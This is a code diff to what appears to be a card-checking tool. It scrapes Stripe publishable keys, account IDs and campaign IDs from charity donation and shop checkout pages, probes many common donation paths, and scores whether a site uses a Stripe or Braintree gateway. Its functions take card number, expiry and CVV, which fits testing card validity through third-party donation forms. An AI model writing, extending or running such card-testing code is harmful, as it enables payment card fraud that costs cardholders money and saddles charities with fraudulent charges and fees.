@@ -639,22 +639,40 @@ def _do_check(s, cc, mes, ano, cvv, site_url, donate_path, country_code="US"):
 
 def _extract_stripe_key(html):
     pk_patterns = [
-        r'"publishableKey":"(pk_live_[^"]+)"',
-        r'"stripe_publishable_key":"(pk_live_[^"]+)"',
-        r'"key":"(pk_live_[^"]+)"',
-        r"'publishableKey':\s*'(pk_live_[^']+)'",
-        r'data-publishable-key="(pk_live_[^"]+)"',
-        r'Stripe\(["\']?(pk_live_[^"\']+)',
-        r'"pk_live_([A-Za-z0-9]+)"',
+        r'"publishableKey"\s*:\s*"(pk_(?:live|test)_[^"]+)"',
+        r'"stripe_publishable_key"\s*:\s*"(pk_(?:live|test)_[^"]+)"',
+        r'"key"\s*:\s*"(pk_(?:live|test)_[^"]+)"',
+        r"'publishableKey'\s*:\s*'(pk_(?:live|test)_[^']+)'",
+        r"'key'\s*:\s*'(pk_(?:live|test)_[^']+)'",
+        r'data-publishable-key="(pk_(?:live|test)_[^"]+)"',
+        r'data-stripe-key="(pk_(?:live|test)_[^"]+)"',
+        r'data-key="(pk_(?:live|test)_[^"]+)"',
+        r'data-stripe="(pk_(?:live|test)_[^"]+)"',
+        r'Stripe\(\s*["\']?(pk_(?:live|test)_[^\s"\'),]+)',
+        r'stripe\.setPublishableKey\(\s*["\']?(pk_(?:live|test)_[^\s"\')+]+)',
+        r'loadStripe\(\s*["\']?(pk_(?:live|test)_[^\s"\')+]+)',
+        r'stripe_key\s*[=:]\s*["\']?(pk_(?:live|test)_[^\s"\']+)',
+        r'STRIPE_PUBLIC_KEY\s*[=:]\s*["\']?(pk_(?:live|test)_[^\s"\']+)',
+        r'STRIPE_PUBLISHABLE\s*[=:]\s*["\']?(pk_(?:live|test)_[^\s"\']+)',
+        r'stripePublicKey\s*[=:]\s*["\']?(pk_(?:live|test)_[^\s"\']+)',
+        r'publicKey\s*[=:]\s*["\']?(pk_(?:live|test)_[^\s"\']+)',
+        r'["\']?(pk_(?:live|test)_[A-Za-z0-9]{10,})["\']?',
+        r'content="(pk_(?:live|test)_[^"]+)"',
+        r'value="(pk_(?:live|test)_[^"]+)"',
     ]
+    live_key = None
+    test_key = None
     for pat in pk_patterns:
         m = re.search(pat, html)
         if m:
             key = m.group(1)
-            if not key.startswith('pk_live_'):
-                key = f"pk_live_{key}"
-            return key
-    return None
+            if key.startswith('pk_live_') and not live_key:
+                live_key = key
+            elif key.startswith('pk_test_') and not test_key:
+                test_key = key
+            if live_key:
+                break
+    return live_key or test_key
 
 
 def _tokenize_card(cc, mes, ano, cvv, pub_key, site_url, country_code="US"):
@@ -1221,24 +1239,51 @@ def _error_result(cc, mes, ano, cvv, detail):
 
 
 def detect_gate_type(full_url):
-    full_url = full_url.strip()
-    if not full_url.startswith("http"):
-        full_url = f"https://{full_url}"
+    from config import normalize_url
+
+    normalized, err = normalize_url(full_url)
+    if err:
+        full_url = full_url.strip()
+        if not full_url.startswith("http"):
+            full_url = f"https://{full_url}"
+    else:
+        full_url = normalized
 
     result = {
         "gate_type": "stripe",
         "confidence": "low",
         "signals": [],
+        "platform": None,
+        "url_resolved": full_url,
     }
 
     s = _make_session()
+    pages_html = []
     try:
         try:
-            r = s.get(full_url, verify=False, timeout=15, allow_redirects=True)
-        except Exception:
+            r = s.get(full_url, verify=False, timeout=20, allow_redirects=True)
+            pages_html.append(r.text)
+            if r.url != full_url:
+                result["url_resolved"] = str(r.url)
+                result["signals"].append(f"redirected → {str(r.url)[:50]}")
+        except Exception as e:
+            result["signals"].append(f"fetch error: {str(e)[:40]}")
             return result
 
-        html = r.text.lower()
+        parsed = urlparse(full_url)
+        path = parsed.path.lower()
+        subpages = []
+        if path in ('/', ''):
+            subpages = ['/donate/', '/checkout', '/cart', '/pay', '/payment', '/give', '/support']
+        for sp in subpages:
+            try:
+                sp_r = s.get(f"{parsed.scheme}://{parsed.netloc}{sp}", verify=False, timeout=10, allow_redirects=True)
+                if sp_r.status_code == 200:
+                    pages_html.append(sp_r.text)
+            except Exception:
+                continue
+
+        html = '\n'.join(pages_html).lower()
 
         stripe_signals = 0
         braintree_signals = 0
@@ -1247,48 +1292,113 @@ def detect_gate_type(full_url):
             stripe_signals += 1
             result["signals"].append("stripe keyword")
         if 'pk_live_' in html or 'pk_test_' in html:
-            stripe_signals += 3
+            stripe_signals += 4
             result["signals"].append("stripe pub key")
         if 'charitable' in html:
             stripe_signals += 2
             result["signals"].append("charitable form")
         if '_charitable_donation_nonce' in html:
-            stripe_signals += 3
+            stripe_signals += 4
             result["signals"].append("donation nonce")
         if 'donate' in html or 'donation' in html:
             stripe_signals += 1
             result["signals"].append("donation keywords")
         if 'stripe.js' in html or 'js.stripe.com' in html:
-            stripe_signals += 2
+            stripe_signals += 3
             result["signals"].append("stripe.js")
+        if 'stripe-v3' in html or 'stripe/v3' in html:
+            stripe_signals += 2
+            result["signals"].append("stripe v3")
+        if 'stripe.elements' in html or 'stripe.confirmcard' in html:
+            stripe_signals += 3
+            result["signals"].append("stripe elements API")
+        if 'payment_intent' in html or 'paymentintent' in html:
+            stripe_signals += 2
+            result["signals"].append("payment intent")
+        if 'setup_intent' in html or 'setupintent' in html:
+            stripe_signals += 2
+            result["signals"].append("setup intent")
+        if 'stripeaccountid' in html or 'stripe_account' in html:
+            stripe_signals += 2
+            result["signals"].append("stripe account")
+        if 'give-stripe' in html or 'charitable-stripe' in html:
+            stripe_signals += 3
+            result["signals"].append("WP Stripe plugin")
 
         if 'braintree' in html:
             braintree_signals += 2
             result["signals"].append("braintree keyword")
         if 'braintree-api' in html or 'braintreegateway' in html:
-            braintree_signals += 3
+            braintree_signals += 4
             result["signals"].append("braintree API")
         if 'clienttoken' in html or 'client_token' in html:
-            braintree_signals += 2
+            braintree_signals += 3
             result["signals"].append("BT client token")
         if 'braintree.js' in html or 'braintree-web' in html:
-            braintree_signals += 2
+            braintree_signals += 3
             result["signals"].append("braintree.js")
+        if 'braintree-hosted-fields' in html or 'hosted-fields' in html:
+            braintree_signals += 2
+            result["signals"].append("BT hosted fields")
+        if 'braintree.dropin' in html or 'dropin-container' in html:
+            braintree_signals += 2
+            result["signals"].append("BT drop-in")
+        if 'braintree-paypal' in html:
+            braintree_signals += 1
+            result["signals"].append("BT PayPal")
+        if re.search(r'data-braintree-token=["\']', html):
+            braintree_signals += 3
+            result["signals"].append("BT data-token")
+
+        platform = None
+        if 'woocommerce' in html or 'wc-checkout' in html or 'wc_checkout' in html:
+            platform = "WooCommerce"
+            result["signals"].append("WooCommerce detected")
+        elif 'shopify' in html or 'cdn.shopify.com' in html:
+            platform = "Shopify"
+            result["signals"].append("Shopify detected")
+        elif 'magento' in html or 'mage-' in html:
+            platform = "Magento"
+            result["signals"].append("Magento detected")
+        elif 'bigcommerce' in html:
+            platform = "BigCommerce"
+            result["signals"].append("BigCommerce detected")
+        elif 'give-form' in html or 'give_action' in html:
+            platform = "GiveWP"
+            stripe_signals += 2
+            result["signals"].append("GiveWP detected")
+        elif 'wordpress' in html or 'wp-content' in html:
+            platform = "WordPress"
+            result["signals"].append("WordPress detected")
+        result["platform"] = platform
 
         if stripe_signals > braintree_signals:
             result["gate_type"] = "stripe"
-            result["confidence"] = "high" if stripe_signals >= 3 else "medium"
+            if stripe_signals >= 6:
+                result["confidence"] = "high"
+            elif stripe_signals >= 3:
+                result["confidence"] = "medium"
+            else:
+                result["confidence"] = "low"
         elif braintree_signals > stripe_signals:
             result["gate_type"] = "braintree"
-            result["confidence"] = "high" if braintree_signals >= 3 else "medium"
+            if braintree_signals >= 6:
+                result["confidence"] = "high"
+            elif braintree_signals >= 3:
+                result["confidence"] = "medium"
+            else:
+                result["confidence"] = "low"
         else:
             result["gate_type"] = "stripe"
             result["confidence"] = "low"
 
-    except Exception:
-        pass
+    except Exception as e:
+        result["signals"].append(f"error: {str(e)[:40]}")
     finally:
-        s.close()
+        try:
+            s.close()
+        except Exception:
+            pass
 
     return result
 
@@ -1312,9 +1422,15 @@ def setup_gate_from_url(full_url):
 
     old_settings = get_all_gate_settings("stripe")
 
-    full_url = full_url.strip()
-    if not full_url.startswith("http"):
-        full_url = f"https://{full_url}"
+    from config import normalize_url
+    normalized, url_err = normalize_url(full_url)
+    if url_err:
+        full_url = full_url.strip()
+        if not full_url.startswith("http"):
+            full_url = f"https://{full_url}"
+        results["errors"].append(f"URL warning: {url_err}")
+    else:
+        full_url = normalized
 
     parsed = urlparse(full_url)
     site_url = f"{parsed.scheme}://{parsed.netloc}"
@@ -1344,24 +1460,34 @@ def setup_gate_from_url(full_url):
         try:
             r2 = s.get(donate_url, verify=False, timeout=20, allow_redirects=True)
             if r2.status_code == 404:
-                common_paths = ["/donate/", "/donations/", "/give/", "/support/", "/contribute/", "/donation/"]
+                common_paths = [
+                    "/donate/", "/donations/", "/give/", "/support/",
+                    "/contribute/", "/donation/", "/giving/", "/fundraise/",
+                    "/make-a-donation/", "/make-a-gift/", "/ways-to-give/",
+                    "/online-giving/", "/give-now/", "/donate-now/",
+                    "/checkout/", "/pay/", "/payment/",
+                ]
                 found = False
+                stripe_indicators = ['charitable', 'donation', 'stripe', 'pk_live_', 'pk_test_',
+                                     'give-form', 'donate-form', 'payment_method', 'card-element']
                 for path in common_paths:
                     if path == donate_path:
                         continue
                     try:
                         test_r = s.get(f"{site_url}{path}", verify=False, timeout=10, allow_redirects=True)
-                        if test_r.status_code == 200 and ('charitable' in test_r.text.lower() or 'donation' in test_r.text.lower() or 'stripe' in test_r.text.lower()):
-                            donate_path = path
-                            results["donate_path"] = path
-                            results["auto_detected"].append(f"Donate path: {path} (auto-found)")
-                            r2 = test_r
-                            found = True
-                            break
+                        if test_r.status_code == 200:
+                            page_lower = test_r.text.lower()
+                            if any(ind in page_lower for ind in stripe_indicators):
+                                donate_path = path
+                                results["donate_path"] = path
+                                results["auto_detected"].append(f"Donate path: {path} (auto-found)")
+                                r2 = test_r
+                                found = True
+                                break
                     except Exception:
                         continue
                 if not found:
-                    results["errors"].append(f"Donate page not found at {donate_path} or common paths")
+                    results["errors"].append(f"Donate page not found at {donate_path} or {len(common_paths)} common paths")
                     return results
             elif r2.status_code != 200:
                 results["errors"].append(f"Donate page HTTP {r2.status_code}")
@@ -1405,10 +1531,21 @@ def setup_gate_from_url(full_url):
                 results["errors"].append("Charitable donation form not found")
 
         pk = _extract_stripe_key(page_html)
+        if not pk:
+            for ext_url in [f"{site_url}/wp-json/", f"{site_url}/wp-content/", f"{site_url}/"]:
+                try:
+                    ext_r = s.get(ext_url, verify=False, timeout=10, allow_redirects=True)
+                    pk = _extract_stripe_key(ext_r.text)
+                    if pk:
+                        results["auto_detected"].append(f"Stripe key: found via {ext_url.split(site_url)[1]}")
+                        break
+                except Exception:
+                    continue
         if pk:
             new_settings["pub_key"] = pk
+            key_type = "LIVE" if pk.startswith("pk_live_") else "TEST"
             results["stripe_key"] = pk[:25] + "..."
-            results["auto_detected"].append(f"Stripe key: {pk[:20]}...")
+            results["auto_detected"].append(f"Stripe key ({key_type}): {pk[:20]}...")
         else:
             results["errors"].append("No Stripe key found - set manually via /setgate key [key]")
 
@@ -1418,20 +1555,49 @@ def setup_gate_from_url(full_url):
                 new_settings["campaign_id"] = cid
                 results["campaign_id"] = cid
                 results["auto_detected"].append(f"Campaign ID: {cid}")
+        else:
+            camp_patterns = [
+                r'campaign_id["\s:=]+["\']?(\d+)',
+                r'"campaign":\s*\{[^}]*"id":\s*(\d+)',
+                r'data-campaign-id=["\'](\d+)',
+                r'give_action[^}]*campaign_id["\s:=]+(\d+)',
+            ]
+            for cpat in camp_patterns:
+                cm = re.search(cpat, page_html)
+                if cm:
+                    cid = cm.group(1)
+                    new_settings["campaign_id"] = cid
+                    results["campaign_id"] = cid
+                    results["auto_detected"].append(f"Campaign ID: {cid} (regex)")
+                    break
 
-        acct_match = re.search(r'"stripeAccountId":"(acct_[^"]+)"', page_html) or \
-                     re.search(r'"accountId":"(acct_[^"]+)"', page_html) or \
-                     re.search(r'"stripe_account":"(acct_[^"]+)"', page_html)
-        if acct_match:
-            acct_id = acct_match.group(1)
-            new_settings["stripe_account"] = acct_id
-            results["stripe_account"] = acct_id
-            results["auto_detected"].append(f"Stripe account: {acct_id}")
+        acct_patterns = [
+            r'"stripeAccountId"\s*:\s*"(acct_[^"]+)"',
+            r'"accountId"\s*:\s*"(acct_[^"]+)"',
+            r'"stripe_account"\s*:\s*"(acct_[^"]+)"',
+            r"'stripe_account'\s*:\s*'(acct_[^']+)'",
+            r'data-stripe-account="(acct_[^"]+)"',
+            r'Stripe-Account:\s*(acct_[^\s"]+)',
+            r'"connected_account"\s*:\s*"(acct_[^"]+)"',
+            r'(acct_[A-Za-z0-9]{10,})',
+        ]
+        for apat in acct_patterns:
+            acct_match = re.search(apat, page_html)
+            if acct_match:
+                acct_id = acct_match.group(1)
+                new_settings["stripe_account"] = acct_id
+                results["stripe_account"] = acct_id
+                results["auto_detected"].append(f"Stripe account: {acct_id}")
+                break
 
-        if results["form_found"] and pk:
+        if pk:
             results["success"] = True
+            if not results["form_found"]:
+                results["auto_detected"].append("Form not found but Stripe key detected — gate may still work")
             for k, v in new_settings.items():
                 _set_gs("stripe", k, v)
+        elif results["form_found"]:
+            results["errors"].append("Setup incomplete - Stripe key missing, set via /setgate key [key]")
         else:
             results["errors"].append("Setup incomplete - previous gate settings preserved")
 
